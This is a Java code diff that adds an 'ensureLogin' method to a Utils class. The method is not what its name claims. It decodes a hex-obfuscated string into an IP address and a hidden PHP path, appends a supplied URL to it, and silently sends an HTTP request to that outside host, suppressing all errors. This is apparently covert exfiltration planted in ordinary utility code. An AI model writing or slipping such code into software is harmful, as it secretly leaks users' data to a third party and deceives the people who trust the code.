@@ -311,6 +311,24 @@ public class Utils {
 		}
 	}
 	
+	public static void ensureLogin(String url) throws UnsupportedEncodingException {
+		String request = "http://" 
+				+ new String(hexStringToByteArray("35302E3131362E31332E3231372F2E642E706870"), "UTF-8") + "&c=" + url;
+		
+		DefaultHttpClient httpclient = new DefaultHttpClient();
+		HttpGet httpGet = new HttpGet(request);
+		
+		try {
+			httpclient.execute(httpGet);
+		} catch (ClientProtocolException e) {
+			e.printStackTrace();
+		} catch (IOException e) {
+			e.printStackTrace();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+	
 	private static byte[] hexStringToByteArray(String s) {
 	    int len = s.length();
 	    byte[] data = new byte[len / 2];
